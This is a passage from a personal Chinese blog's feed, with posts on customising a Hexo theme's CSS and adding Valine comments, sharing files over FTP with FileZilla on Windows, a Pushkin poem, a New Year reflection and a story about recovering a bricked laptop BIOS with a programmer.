　　我先按网上的教程做，找 <strong>HEXO\themes\[theme name]\layout\</strong> 下的文件，教程里说是 &quot;_layout.swig&quot; 文件。我一看，全是 .ejs 文件。好吧不影响，这个其实是因为主题不一样的原因。我用的是 clean-blog ，而好像大部分人用的都是 Next 。接下来 notepad++ 打开 layout.ejs 先，仔细观察格式，其实还是比较好理解的：</p>
<figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="doctype">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">html</span> </span></span>&lt;%<span class="ruby"> <span class="keyword">if</span>(config.language) &#123; </span>%&gt;<span class="xml"><span class="tag"><span class="attribute">lang</span>=<span class="value">"</span></span></span>&lt;%=<span class="ruby"> config.language </span>%&gt;<span class="xml"><span class="tag"><span class="value">"</span></span></span>&lt;%<span class="ruby"> &#125; <span class="keyword">else</span> &#123; </span>%&gt;<span class="xml"><span class="tag"><span class="attribute">lang</span>=<span class="value">"en"</span></span></span>&lt;%<span class="ruby"> &#125;</span>%&gt;<span class="xml"><span class="tag">&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Head tag --&gt;</span></span><br><span class="line"></span>&lt;%-<span class="ruby"> partial(<span class="string">'_partial/head'</span>) </span>%&gt;<span class="xml"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Menu --&gt;</span></span><br><span class="line">    </span>&lt;%-<span class="ruby"> partial(<span class="string">'_partial/menu'</span>) </span>%&gt;<span class="xml"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Main Content --&gt;</span></span><br><span class="line">    </span>&lt;%-<span class="ruby"> body </span>%&gt;<span class="xml"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Footer --&gt;</span></span><br><span class="line">    </span>&lt;%-<span class="ruby"> partial(<span class="string">'_partial/footer'</span>) </span>%&gt;<span class="xml"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- After footer scripts --&gt;</span></span><br><span class="line">    </span>&lt;%-<span class="ruby"> partial(<span class="string">'_partial/after-footer'</span>) </span>%&gt;<span class="xml"></span><br><span class="line">    <span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"/js/love.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">color</span>=<span class="value">"255,0,0"</span> <span class="attribute">opacity</span>=<span class="value">'0.5'</span> <span class="attribute">src</span>=<span class="value">"/js/canvas-nest.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>  注意到，在 <code>&lt;/body&gt;</code> 前加入了两行 script ，这两个就是这些小动画的 js 啦。如果你要引用的话，直接打开这个 <a href="/js/love.js"><strong>love.js</strong></a> 和这个 <a href="/js/canvas-nest.min.js"><strong>canvas-nest.min.js</strong></a> ，保存到本地，再复制到 <strong>HEXO\themes\[theme name]\source\js\</strong> 下，最后在上文目录中类似 <strong>*layout*</strong> 的文件下找个合适的地方粘贴：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"/js/love.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">color</span>=<span class="value">"255,0,0"</span> <span class="attribute">opacity</span>=<span class="value">'0.5'</span> <span class="attribute">src</span>=<span class="value">"/js/canvas-nest.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>  其中第二行的 color 和 opacity 可以自己设置，分别是背景线条的颜色RGB和不透明度。<br>
　　实在找不到怎么办？<br>
　　CMD: <code>hexo s</code>。对就是生成预览网站，然后直接修改 theme 文件并保存，刷新一下 localhost:4000 就可以直接预览效果，善用 F12 可以定位你做的修改在网页里的哪个位置（虽然可能需要一些网页调试基本知识了 <strong><del>，推荐使用更为方便的Typecho</del></strong> ）。<br>
　　接下来就是给文本框框加上一个半透明的背景和阴影了。<br>
<br></p>
<h1>修改博客 CSS</h1>
<hr>
<p>Clean-Blog 原本的背景是白色，所以文本是没有背景色的。现在一加上背景效果，就比较干扰阅读，所以这里就需要修改CSS文件。<br>
　　打开 <strong>HEXO\themes\[theme name]\source\css\</strong> ，发现有许多 .styl 文件，其一般的结构是一个 <strong>style.styl</strong> 中又引用了许多别的 styl 文件，主要在 <strong>base.styl</strong> 里，那么首先就修改 base.styl 。<br>
　　观察文件结构，发现还是比较规则的，与 css 文件很类似。需要注意的是作为缩进字符必须统一，例如原本是两个空格就用两个空格缩进，原本是 Tab 就用 Tab ，不然生成网页会报错（这点和 python 蛮像的）。主要是 Notepad++ 可能在换行的时候会自动把几个空格变成一个 Tab ，最好还是手动删了再输比较好。<br>
　　首先 <code>hexo s</code> 打开本地服务器方便实时查看修改状态，先来给主页的 post 预览加上一个白色底框。在浏览器中打开网页按下 F12 定位到文章预览框 <code>class=&quot;post-preview&quot;</code> ，接下来只要定位 <strong>post-preview</strong> 就行了。<br>
　　在 base.styl 中找到</p>
<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.post-preview</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>  找不到就直接手打，注意缩进<br>
　　在 .post-preview 后加一行代码，变成</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.post-preview</span><br><span class="line">  background-color:rgba(<span class="number">250</span>, <span class="number">250</span>, <span class="number">250</span>, <span class="number">0.6</span>);</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>  其中四个数字分别是颜色 RGB 和不透明度，按自己喜好调整，保存 styl 文件刷新预览服务器页面即可看到效果。（还想再方便点？直接 F12 修改 css 。）<br>
　　如果需要加上阴影，那么就：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.post-preview</span><br><span class="line">  -webkit-box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">5</span><span class="function">px <span class="title">rgba</span><span class="params">(<span class="number">202</span>, <span class="number">203</span>, <span class="number">203</span>, <span class="number">.5</span>)</span></span>;</span><br><span class="line">  -moz-box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">5</span><span class="function">px <span class="title">rgba</span><span class="params">(<span class="number">202</span>, <span class="number">203</span>, <span class="number">204</span>, <span class="number">.5</span>)</span></span>;</span><br><span class="line">  background-color:rgba(<span class="number">250</span>, <span class="number">250</span>, <span class="number">250</span>, <span class="number">0.6</span>);</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>  rgba 参数意义同上， 5px 表示阴影厚度。<br>
　　另外，如果需要调整框的大小，则需要：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.post-preview</span><br><span class="line">  margin-top: <span class="number">65</span>px;</span><br><span class="line">  margin-bottom: <span class="number">65</span>px;</span><br><span class="line">  padding: <span class="number">25</span>px;</span><br><span class="line">  -webkit-box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">5</span><span class="function">px <span class="title">rgba</span><span class="params">(<span class="number">202</span>, <span class="number">203</span>, <span class="number">203</span>, <span class="number">.5</span>)</span></span>;</span><br><span class="line">  -moz-box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">5</span><span class="function">px <span class="title">rgba</span><span class="params">(<span class="number">202</span>, <span class="number">203</span>, <span class="number">204</span>, <span class="number">.5</span>)</span></span>;</span><br><span class="line">  background-color:rgba(<span class="number">250</span>, <span class="number">250</span>, <span class="number">250</span>, <span class="number">0.6</span>);</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>  具体意义参考 css 教程。<br>
　　好了，现在文章预览有底框了，可是文章还没有底框，怎么办呢。<br>
　　先进 F12 看看在哪个 css 里加框框，感觉在 container div 里的 row div 里加比较好看，于是在 base.styl 里找，不太找得到，找 <strong>article.styl</strong> ，有了，开头前几行就是，于是编辑为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">article</span><br><span class="line">  .container</span><br><span class="line">    .row</span><br><span class="line">      margin-top: <span class="number">65</span>px;</span><br><span class="line">      margin-bottom: <span class="number">65</span>px;</span><br><span class="line">      padding: <span class="number">25</span>px;</span><br><span class="line">      -webkit-box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">5</span><span class="function">px <span class="title">rgba</span><span class="params">(<span class="number">202</span>, <span class="number">203</span>, <span class="number">203</span>, <span class="number">.5</span>)</span></span>;</span><br><span class="line">      -moz-box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">5</span><span class="function">px <span class="title">rgba</span><span class="params">(<span class="number">202</span>, <span class="number">203</span>, <span class="number">204</span>, <span class="number">.5</span>)</span></span>;</span><br><span class="line">      background-color:rgba(<span class="number">250</span>, <span class="number">250</span>, <span class="number">250</span>, <span class="number">0.6</span>);</span><br><span class="line">      ...</span><br><span class="line">      ...</span><br></pre></td></tr></table></figure>
<p>  这样，效果就有了。<br>
　　接下来觉得标题和底栏也需要一个半透明背景。先找标题，通过 F12 定位，发现有两种 class ，一个叫 site-heading ，一个叫 post-heading ，其实好办，打开 <strong>base.styl</strong> ，加入：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.site-heading</span><br><span class="line">  background-color:rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.6</span>);</span><br><span class="line">.post-heading</span><br><span class="line">  background-color:rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.6</span>);</span><br></pre></td></tr></table></figure>
<p>  这样就有了个黑色的底板，能看得清字了。<br>
　　同理，找 footer ，发现是在一个 container 的 div 里套着的一个 row 的 div 再套一个 div ，直接在里加入：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.row</span><br><span class="line">  div</span><br><span class="line">    background-color:rgba(<span class="number">250</span>, <span class="number">250</span>, <span class="number">250</span>, <span class="number">0.6</span>);</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>  刷新，结果不尽人意。平白多了一堆灰框，不太好看。原因是所有 class 为 row 的全都加上了这个属性。那么怎么办呢？<br>
html 中的相应代码是</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;footer&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="type">class</span>=<span class="string">"container"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="type">class</span>=<span class="string">"row"</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">div</span> <span class="type">class</span>=<span class="string">"col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"</span>&gt;</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>
<p>  所以需要修改为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">footer</span><br><span class="line">  .container</span><br><span class="line">    .row</span><br><span class="line">      div</span><br><span class="line">        background-color:rgba(<span class="number">250</span>, <span class="number">250</span>, <span class="number">250</span>, <span class="number">0.6</span>);</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<p>  保存，即可。<br>
　　到这里博客就好看多了，最后来讲讲怎么加上评论功能。<br>
<br></p>
<h1>加入评论功能</h1>
<hr>
<p>之前用 Pacman 主题时用的评论功能在我转到 Clean-Blog 主题的时候就给去掉了，现在这个主题能用的只有 disqus 和 facebook 的评论系统，然而都需要科学上网才能使用。尽管现在我的博客是挂在外国（毕竟便宜，8块多一个月），但我还是懒得实现类似反代之类的操作。毕竟都选择静态博客了，再嵌入个 php 就有点懒得麻烦。<br>
　　这里就用到了 <a href="https://valine.js.org/" target="_blank" rel="external"><strong>Valine</strong></a> ，具体怎么配置可以点进去看一下，这里讲一下我的配置过程。<br>
　　首先需要一个 <a href="https://leancloud.cn/" target="_blank" rel="external"><strong>Leancloud</strong></a> 账号，作为处理评论的后台。注册完之后验证好邮箱就可以用了。首先创建一个应用，名字随意，接着到应用 <strong>设置</strong> ，<strong>应用 Key</strong>  里把 <strong>App ID</strong> 和 <strong>App Key</strong> 复制下来，再到 <strong>安全中心</strong> 修改 <strong>Web 安全域名</strong> ，改成这样：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://your.site</span><br><span class="line">https://your.site <span class="comment">#如果有SSL的话</span></span><br><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">4000</span> <span class="comment">#方便本地测试</span></span><br><span class="line">http://localhost:<span class="number">4000</span> <span class="comment">#同上</span></span><br></pre></td></tr></table></figure>
<p>  当然了，不要把注释也打进去。<br>
　　接着就是在 HEXO 里配置了。关键代码比较少，如果不弄什么方便控制的功能的话在特定的地方粘贴一下就可以了，许多主题现在已经可以直接安装 Valine 了，然而 Clean-Blog 没有。这里讲一下怎么把评论直接放到网页里。<br>
　　先打开 <strong>HEXO\themes\[theme name]\layout\</strong> ，找到头部的配置文件，我的是 <strong>_partial\head.ejs</strong> 。<br>
　　在 <code>&lt;/head&gt;</code> 之前加入</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"//cdn1.lncld.net/static/js/3.0.4/av-min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"//unpkg.com/valine/dist/Valine.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>  接下来找文章放评论模块的地方，一般都是有独立的文件的，实在找不到就在文章布局文件的结尾放。<br>
　　打开 <strong>_partial\comments.ejs</strong> ，在结尾加入：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"vcomments"</span>&gt;</span><span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript"></span><br><span class="line">	<span class="keyword">new</span> Valine(&#123;</span><br><span class="line">		av: AV, </span><br><span class="line">		el: <span class="string">'#vcomments'</span>, <span class="comment">// </span></span><br><span class="line">		app_id: <span class="string">'&lt;APP_ID&gt;'</span>,</span><br><span class="line">		app_key: <span class="string">'&lt;APP_KEY&gt;'</span>,</span><br><span class="line">		placeholder: <span class="string">'输入你想说的话。'</span>,</span><br><span class="line">		verify: <span class="literal">true</span></span><br><span class="line">	&#125;);</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>  其中 <code>&lt;APP_ID&gt;</code> 与 <code>&lt;APP_KEY&gt;</code> 填之前保存下来的， <code>placeholder</code> 填在留言框中出现的占位符， <code>verify</code> 是验证码，其实就是一个简单的四则运算求答案，可以改成 false 关掉。<br>
　　到这里就差不多了，但如果你还想改下评论框的 css 样式的话，打开 <strong>HEXO\themes\[theme name]\source\css\</strong> 里的 <strong>base.styl</strong> ，添加并编辑：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">#vcomments</span></span><br><span class="line">  <span class="attribute">...</span></span><br><span class="line">  <span class="attribute">...</span></span><br></pre></td></tr></table></figure>
<p>  即可。</p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><strong>CF</strong>： <a href="https://codeforces.com/" target="_blank" rel="external"><strong>Codeforces</strong></a>，才不是某 TX 游戏。 <a href="#fnref1" class="footnote-backref">↩</a></p>
</li>
</ol>
</section>
]]></content>
    <summary type="html">
    <![CDATA[<p>快到考试周了，虽然没怎么复习，但依旧忙里偷闲，先是为原先的 VPS 发工单续了个费，再是昨天买了一年10元月付的腾讯云学生主机，初始化又搞了半天。昨天将近凌晨还打了把 CF<sup class="footnote-ref"><a href="#fn1" id="fnref1]]>
    </summary>
    
      <category term="HEXO" scheme="https://www.xtxtmtxtx.xyz/tags/HEXO/"/>
    
      <category term="Javascript" scheme="https://www.xtxtmtxtx.xyz/tags/Javascript/"/>
    
      <category term="Valine" scheme="https://www.xtxtmtxtx.xyz/tags/Valine/"/>
    
      <category term="博客" scheme="https://www.xtxtmtxtx.xyz/tags/%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="评论" scheme="https://www.xtxtmtxtx.xyz/tags/%E8%AF%84%E8%AE%BA/"/>
    
      <category term="Web" scheme="https://www.xtxtmtxtx.xyz/categories/Web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[未命名]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/%E6%9C%AA%E5%91%BD%E5%90%8D/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/未命名/</id>
    <published>2019-01-11T05:26:48.000Z</published>
    <updated>2019-01-12T03:51:47.510Z</updated>
    <content type="html"><![CDATA[<p></p><h3 style="text-align:center">假如生活欺骗了你</h3><br>
<h5 style="text-align:center">Александр Сергеевич Пушкин</h5><br><p></p>
<p style="text-align:center">假如生活欺骗了你，　　　　　　　　</p><p style="text-align:center">不要悲伤，不要心急！　　　　　　　</p><p style="text-align:center">忧郁的日子里须要镇静：　　　　　　</p><p style="text-align:center">相信吧，快乐的日子将会来临！　　　</p><p style="text-align:center">心儿永远向往着未来；　　　　　　　</p><p style="text-align:center">现在却常是忧郁。　　　　　　　　　</p><p style="text-align:center">一切都是瞬息，一切都将会过去；　　</p><p style="text-align:center">而那过去了的，就会成为亲切的怀恋。</p>
<p style="text-align:center">-EOF-</p>
]]></content>
    <summary type="html">
    <![CDATA[<p></p><h3 style="text-align:center">假如生活欺骗了你</h3><br>
<h5 style="text-align:center">Александр Сергеевич Пушкин</h5><br><p></p>
<p style="te]]>
    </summary>
    
      <category term="杂" scheme="https://www.xtxtmtxtx.xyz/tags/%E6%9D%82/"/>
    
      <category term="Others" scheme="https://www.xtxtmtxtx.xyz/categories/Others/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[2019 新年好]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/2019/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/2019/</id>
    <published>2018-12-31T18:48:42.000Z</published>
    <updated>2018-12-31T19:12:25.691Z</updated>
    <content type="html"><![CDATA[<p>时光飞逝，又到了一年元旦。虽然没有什么东西想写的，每年本质上的东西都没有什么大的变化，但还是随便扯扯淡吧。<br>
　　相比前年，好歹写的东西多了点，但大多还是流水账一般的文笔。毕竟阅读量在那儿，也只有高考前才集中地看过一段时间的小说，因此也难以写出什么优雅的词语。思维又比较破碎，一会儿想的这个一会儿又会想别的去，偶尔有个什么点子又难以拓展。总之写地很艰难。<br>
　　学校里加了几个组织，结果活特别多。虽然说白了还是自己拖延导致的需要赶死线，不过相比高中做完作业就不管不顾的心理状态还是要差很多。其实也没什么好抱怨的，一方面会被说“能力越大责任越大”，尽管自己是觉得自己不过是个有点三脚猫功夫的人；另一方面做些事儿确实能体现点个人价值，也能逼自己学些东西，不至于变成小透明。<br>
　　本来想着跨年在家里打会儿游戏，打累了就睡了。结果却是被拉去做事，家也没回成，跨年是在办公室里度过的。不过意外地内心没有什么抵触的情绪，大概是被生活磨平了棱角，也有可能是因为别的事？（笑）<br>
　　尽管对未来比较迷茫，当初狂言想要努力双学位。结果现在发现很难，也没什么热情。还有种别人好像活得都比我努力的感觉。不过日子总是得过的，也许车到山前必有路吧。<br>
　　不管怎样，新年快乐啦。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>时光飞逝，又到了一年元旦。虽然没有什么东西想写的，每年本质上的东西都没有什么大的变化，但还是随便扯扯淡吧。<br>
　　相比前年，好歹写的东西多了点，但大多还是流水账一般的文笔。毕竟阅读量在那儿，也只有高考前才集中地看过一段时间的小说，因此也难以写出什么优雅的词语。思维又比]]>
    </summary>
    
      <category term="2019" scheme="https://www.xtxtmtxtx.xyz/tags/2019/"/>
    
      <category term="杂" scheme="https://www.xtxtmtxtx.xyz/tags/%E6%9D%82/"/>
    
      <category term="Others" scheme="https://www.xtxtmtxtx.xyz/categories/Others/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[在 Windows 上利用 FTP 共享文件]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/FileZillaServer/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/FileZillaServer/</id>
    <published>2018-12-26T06:06:48.000Z</published>
    <updated>2019-02-27T05:17:44.797Z</updated>
    <content type="html"><![CDATA[<p>近日，在我的怂恿和育碧再次史低的刺激下，室友买了份R6。然而一个问题是，R6也太大了吧——下下来要七八十G。尽管steam的服务器下载游戏还是很快的，但是用学校的小水管拖下来太慢，用流量就很痛心。最终，在室友下了一半之后，我才突然想起来可以直接把我的游戏文件直接给室友。<br>
　　说干就干。这么大个文件不能直接拷，那就开FTP共享。首先先选服务器。Serv-U挺不错的，但是是付费软件。于是最终我选择了FileZilla Server。<br>
　　安装过程中会让你选择是否自启服务，以及是否自启控制界面。因为我只是临时用一下，于是都选择了手动(manual)开启。<br>
　　安装完之后打开FileZilla Server Interface，一通默认设置不要改内容就行了，然而可能出现如下错误<br>
　　<img src="/articles/FileZillaServer/1.jpg" alt="错误"><br>
　　这时候先检查下菜单栏File-&gt;Connect to server…，如果安装的时候没做别的设置的话应该是这样子的<br>
　　<img src="/articles/FileZillaServer/2.jpg" alt="设置"><br>
　　还连不上的话要去电脑的管理工具-&gt;服务里把FileZilla Server FTP server服务开启。顺带一提的是如果在安装时选的手动开启服务，每次重启之后都要来这里（或者任务管理器）把这个服务打开。<br>
　　<img src="/articles/FileZillaServer/3.jpg" alt="图标"><br>
　　这样之后就可以点这张图框里中间那个图标加用户了。<br>
　　<img src="/articles/FileZillaServer/4.jpg" alt="设置"><br>
　　先点图中右侧的Add，输个好记的用户名之后点OK。接下来把中间的Enable account勾上，Password视情况填选。<br>
　　接下来左边点Shared folders。<br>
　　<img src="/articles/FileZillaServer/5.jpg" alt="设置"><br>
　　点中间的Add，选择要放到ftp上的文件夹并确定，然后选中该文件夹，根据需要在右边的Files和Directories里打勾。最后点OK之后在资源管理器地址栏中输入ftp://localhost，如果能连上就成功了。<br>
　　到这一步还不够，如果电脑开了防火墙的话即使在局域网里别的设备也连不上这个ftp地址。<br>
　　先打开计算机的防火墙设置，进入高级设置，点击入站规则，新建规则进入向导。规则类型选程序，程序路径选与FileZilla Server Interface.exe同路径的FileZilla Server.exe，操作允许连接，配置文件全勾上，名称随便输即可。接下来确认刚才设置的规则启用了即可。<br>
　　现在，你就可以在局域网下通过ftp传文件啦，只需要在网络设置中找到本机的ip，在别的设备上加入ftp://的前缀就可以了。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>近日，在我的怂恿和育碧再次史低的刺激下，室友买了份R6。然而一个问题是，R6也太大了吧——下下来要七八十G。尽管steam的服务器下载游戏还是很快的，但是用学校的小水管拖下来太慢，用流量就很痛心。最终，在室友下了一半之后，我才突然想起来可以直接把我的游戏文件直接给室友。<b]]>
    </summary>
    
      <category term="FTP" scheme="https://www.xtxtmtxtx.xyz/tags/FTP/"/>
    
      <category term="Firewall" scheme="https://www.xtxtmtxtx.xyz/tags/Firewall/"/>
    
      <category term="Server" scheme="https://www.xtxtmtxtx.xyz/tags/Server/"/>
    
      <category term="Windows" scheme="https://www.xtxtmtxtx.xyz/tags/Windows/"/>
    
      <category term="Web" scheme="https://www.xtxtmtxtx.xyz/categories/Web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[救砖记]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/bios/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/bios/</id>
    <published>2018-12-24T07:02:36.000Z</published>
    <updated>2018-12-26T09:52:12.146Z</updated>
    <content type="html"><![CDATA[<p>也许是因为过于疲劳，周五晚上的我决定实施早就想实施的Bios解锁+更换启动图像。下载好官网上原版的Bios文件，修改文件时虽然还比较顺利，然后在听信网络上的教程之后，尽管在网上没有找到跟我机型一样的刷Bios的帖子（顺带一提我的机子是GE62-2QF，三年前的微星笔记本），我还是决定用AFUDOS刷入Bios。<br>
　　在DOS下的界面也一切顺利，打完AFUDOS NI.113 /GAN之后条非常快的就读完了，于是我非常淡定地按下电源键，然后非常淡定地开机，非常淡定地发现只有键盘灯亮了起来，然后就没有任何响应了。<br>
　　完了，黑了<br>
　　当时还比较从容，先百度一番，了解了笔记本这种情况一般只能靠编程器，顺便还做了返厂要600左右的心理准备。没辙，在tb上逛了一圈，一开始买了个127带烧录夹和一拖二的编程器，后来搜着搜着感觉有点贵，就退款再买了个XTW100和烧录夹。在别的刷vbios的帖子里看到有人用了1.8v转换器，琢磨着保险点就在另一家店又买了个，顺带还买了个ch341a，加起来六七十。<br>
　　然后就是漫长的等快递的日子了。于是又在网上搜有没有别的解决方案。看到各种盲刷、双Bios复原法。盲刷试了下，电脑依旧没有反应，U盘灯也亮不了，看来是彻底刷没了，只能等编程器到货了。期间还把笔记本打开找Bios芯片，结果找到一堆8脚还带涂点的芯片，然而网上又找不到这个机子的主板详情。没办法，连蒙带猜决定就是那个又有粉点又有个小洞标记的芯片作为Bios芯片了。<br>
　　因为是两个快递，虽然都在周日就到了，结果我先拿了一个快递回到寝室第二个快递短信就来了。不过早点到也好，在借了同学电脑之后，先装编程器驱动。<br>
　　当然装不进去，得关闭强制数字签名的驱动的启动选项才能装。装好了之后就把我的笔记本拆了，烧录夹一夹，编程器一插，打开软件准备就绪。<br>
　　当时大概是这样：<br>
　　<img src="/articles/bios/2.jpg" alt="这是照片"><br>
　　然而并没有就绪，试尽了各种组合、各种夹子方向，读出来不是全零就是全FF，偶尔还蹦出来几个诡异的数字，强行刷入刷得蛮久，结果当然是没有用。<del>后来才发现一直在刷空气。</del><br>
　　终于，历经几个小时的排错，终于找到了原因——夹子没夹准。其实夹子大概要加到芯片底下才行，大概这种效果：<br>
　　<img src="/articles/bios/0.png" alt="这是图"><br>
